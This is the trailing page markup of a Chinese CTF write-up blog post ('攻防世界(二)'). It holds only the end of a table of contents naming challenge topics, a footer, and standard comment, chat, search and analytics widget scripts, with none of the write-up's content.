class="toc-text">后端django服务gbk编码导致宽字符绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cblgdel"><span class="toc-number">12.</span> <span class="toc-text">攻防世界blgdel</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: 'https://valine.wanan.red',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.wanan.red/b9fabd21.html'
    this.page.identifier = '/b9fabd21.html'
    this.page.title = '攻防世界(二)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>